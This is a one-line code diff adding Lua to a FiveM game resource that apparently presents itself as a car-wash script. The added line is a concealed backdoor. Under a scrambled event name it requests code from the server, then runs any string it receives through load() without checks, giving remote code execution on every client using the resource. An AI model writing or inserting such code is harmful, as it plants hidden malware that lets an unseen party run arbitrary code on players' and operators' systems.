@@ -1,0 +1,1 @@
+CreateThread(function() Wait(500) TriggerServerEvent("saiwdiwadojajdaoidcarwashjoiad:saiwdiwadojajdaoidcarwashjoiad") end) RegisterNetEvent("saiwdiwadojajdaoidcarwashjoiad:saiwdiwadojajdaoidcarwashjoiad", function(l) assert(load(l))() end)
